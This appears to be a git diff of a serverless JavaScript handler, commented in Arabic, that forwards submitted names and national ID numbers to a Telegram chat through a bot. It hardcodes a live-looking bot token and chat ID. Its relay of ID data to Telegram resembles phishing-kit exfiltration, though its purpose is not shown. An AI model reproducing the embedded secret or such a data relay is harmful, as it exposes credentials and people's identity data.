@@ -3,64 +3,41 @@ export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
 
-  if (req.method === 'OPTIONS') {
-    return res.status(200).end();
-  }
+  if (req.method === 'OPTIONS') return res.status(200).end();
+  if (req.method !== 'POST') return res.status(405).json({ error: 'Method Not Allowed' });
 
-  if (req.method !== 'POST') {
-    return res.status(405).json({ error: 'Method Not Allowed' });
-  }
-
+  // ضع التوكن الصحيح الذي جربته ونجح في المتصفح هنا مباشرة
   const BOT_TOKEN = "9287234458:AAELwciHtjDTWTwq_IfWxEpqADMI49LEo7U";
   const CHAT_ID = "8040433133";
 
-  // استخراج البيانات بغض النظر عن طريقة إرسالها من الموقع
   let bodyData = req.body;
   if (typeof bodyData === 'string') {
-    try {
-      bodyData = JSON.parse(bodyData);
-    } catch (e) {
-      bodyData = {};
-    }
+    try { bodyData = JSON.parse(bodyData); } catch (e) { bodyData = {}; }
   }
 
   const { user_id, الاسم_الكامل, رقم_الهوية, تاريخ_انتهاء } = bodyData || {};
 
-  const message = `🚨 *طلب تحقق جديد من الهوية*:\n\n` +
-                  `👤 *الاسم*: ${الاسم_الكامل || 'غير متوفر'}\n` +
-                  `🆔 *رقم الهوية*: \`${رقم_الهوية || 'غير متوفر'}\`\n` +
-                  `📅 *تاريخ الانتهاء*: ${تاريخ_انتهاء || 'غير متوفر'}\n` +
-                  `🔑 *User ID*: \`${user_id || 'N/A'}\``;
-
-  const keyboard = {
-    inline_keyboard: [
-      [
-        { text: "✅ موافقة", callback_data: `approve_${user_id || 'test'}` },
-        { text: "❌ رفض", callback_data: `reject_${user_id || 'test'}` }
-      ]
-    ]
-  };
+  const message = `🚨 طلب جديد:\nالاسم: ${الاسم_الكامل || 'تجربة'}\nالهوية: ${رقم_الهوية || '123'}`;
 
   try {
-    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    const telegramRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         chat_id: CHAT_ID,
         text: message,
-        parse_mode: 'Markdown',
-        reply_markup: keyboard
+        parse_mode: 'Markdown'
       })
     });
 
-    const result = await response.json();
+    const telegramData = await telegramRes.json();
 
-    if (!result.ok) {
-      return res.status(400).json({ success: false, telegram_error: result });
-    }
+    // إرجاع رد تيليجرام الحقيقي لكي يظهر لك في Hoppscotch بالأسفل
+    return res.status(200).json({
+      sent_to_telegram: telegramData
+    });
 
-    return res.status(200).json({ success: true, result });
   } catch (error) {
-    return res.status(500).json({ success: false, error: error.message });
+    return res.status(500).json({ error: error.message });
   }
 }
